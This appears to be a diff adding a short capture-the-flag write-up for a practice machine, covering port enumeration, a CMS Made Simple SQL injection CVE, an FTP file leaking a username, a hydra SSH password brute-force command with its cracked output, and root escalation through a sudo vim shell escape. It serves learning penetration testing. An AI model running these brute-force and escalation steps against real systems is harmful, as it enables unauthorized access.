@@ -1,0 +1,63 @@
+
+port 21 ----> vsftpd
+
+port 80 ----> apache httpd
+
+port 2222 ---> openSSH
+
+
+With searchsploit I could not find the actualt CVE which can can exploit it
+
+Then I used gobuster and found ---> directory called simple
+
+-----> Found cms made simple version 2.2.8  was running, was written in the bottom of the web page.
+
+CVE-2019-9053
+
+SQLi
+
+I tried with the exploit code but it failed for me probably due to this reason why Exploit-DB didn't verified it.
+
+I enumerated ftp server and got a file called ForMitch.txt
+
+-----> username: Mitch
+
+hydra -l mitch -P "/usr/share/seclists/Passwords/Common-Credentials/best110.txt" -e nsr -s 2222 10.10.84.167 ssh
+
+
+[DATA] attacking ssh://10.10.84.167:2222/
+[2222][ssh] host: 10.10.84.167   login: mitch   password: secret
+1 of 1 target successfully completed, 1 valid password found
+
+
+user.txt ----> G00d j0b, keep up!
+
+For Priv Escal:
+
+$ sudo -l
+
+---> (root) NOPASSWD: /usr/bin/vim
+
+So, I used:
+
+$ vim 
+
+Then in command mode--->
+
+:!bash
+
+Then I got: bash shell --> mitch@Machine:~$
+
+But I didn't used sudo for priv escal:
+
+mitch@Machine:~$ sudo vim
+
+Then in command mode --->
+
+:!bash
+
+THen I got .... root@Machine:~# 
+
+
+
+
